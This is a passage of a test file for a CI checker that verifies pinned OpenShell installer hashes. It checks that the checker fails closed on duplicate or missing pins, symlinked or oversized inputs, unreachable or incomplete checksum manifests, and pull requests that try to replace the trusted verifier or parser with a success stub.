    expect(result.stdout).not.toContain("PR_CHECKER_EXECUTED");
    expect(result.stdout).toContain("All installer hashes are current");
  });

  it.each([
    "missing-brev-pin",
    "duplicate-brev-pin",
  ] as const)("fails closed when the pull-request tree has a %s", (mode) => {
    const result = runFixture(mode, undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("unable to extract the OpenShell installer pin tables");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("fails closed when the installer pin table contains a duplicate asset", () => {
    const result = runFixture("duplicate-installer-pin", undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("unable to extract the OpenShell installer pin tables");
    expect(result.stdout).toContain(
      `openshell_pinned_sha256 contains duplicate assets: ${ASSETS[0]}`,
    );
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("does not let a pull request replace the trusted verifier with a success stub", () => {
    const result = runFixture("pr-checker-bypass", undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain(
      "STALE: Brev launchable openshell-x86_64-unknown-linux-musl.tar.gz",
    );
    expect(result.stdout).not.toContain("PR_CHECKER_EXECUTED");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("does not let a pull request replace the trusted parser with a success stub", () => {
    const result = runFixture("pr-parser-bypass", undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain(
      "STALE: Brev launchable openshell-x86_64-unknown-linux-musl.tar.gz",
    );
    expect(result.stdout).not.toContain("PR_PARSER_EXECUTED");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it.each([
    ["symlink-installer-input", "installer input must be a regular file and not a symbolic link"],
    [
      "non-regular-brev-input",
      "Brev launchable input must be a regular file and not a symbolic link",
    ],
    ["oversized-installer-input", "installer input exceeds the 1048576-byte limit"],
    [
      "symlink-scripts-parent",
      "installer input parent must be a real directory and not a symbolic link",
    ],
  ] as const)("fails closed for %s", (mode, diagnostic) => {
    const result = runFixture(mode, undefined, true);

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("unable to extract the OpenShell installer pin tables");
    expect(result.stdout).toContain(diagnostic);
    expect(result.stdout).not.toContain("All installer hashes are current");
    expect(result.stdout).not.toContain(SYMLINK_INPUT_MARKER);
    expect(result.stderr).not.toContain(SYMLINK_INPUT_MARKER);
  });

  it("fails closed when the OpenShell checksum release assets are unreachable", () => {
    const result = runFixture("failure");

    expect(result.status).not.toBe(0);
    expect(result.stdout).toContain("Checking OpenShell v0.0.72 release assets");
    expect(result.stdout).toContain("15 OpenShell release-asset check(s) failed");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("fails closed when an OpenShell checksum manifest is incomplete", () => {
    const result = runFixture("partial");

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("digest does not match the pinned v0.0.72 release asset");
    expect(result.stdout).toContain("expected all 11 pinned asset references");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("fails closed when one OpenShell checksum manifest returns HTTP 404", () => {
    const result = runFixture("partial-manifest-missing");

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("OK: openshell-checksums-sha256.txt");
    expect(result.stdout).toContain(
      "STALE: unable to download openshell-gateway-checksums-sha256.txt",
    );
    expect(result.stdout).toContain("OK: openshell-sandbox-checksums-sha256.txt");
    expect(result.stderr).toContain("requested URL returned error: 404");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("fails closed when a pinned installer asset is outside the exact consumed set", () => {
    const result = runFixture("partial-asset-missing");

    expect(result.status).toBe(1);
    expect(result.stdout).toContain("unable to extract the OpenShell installer pin tables");
    expect(result.stdout).toContain(
      "installer pin table must contain the exact consumed asset set",
    );
    expect(result.stdout).toContain(`unexpected=[${UNPUBLISHED_ASSET}]`);
    expect(result.stdout).not.toContain("Checking OpenShell v0.0.72 release assets");
    expect(result.stdout).not.toContain("All installer hashes are current");
  });

  it("fails closed when the Brev launchable pin drifts from the release manifest", () => {
    const result = runFixture("brev-mismatch");

    expect(result.status).toBe(1);
    expect(result.stdout).toContain(
      "STALE: Brev launchable openshell-x86_64-unknown-linux-musl.tar.gz",
    );
    expect(result.stdout).not.toContain("All installer hashes are current");
  });
});
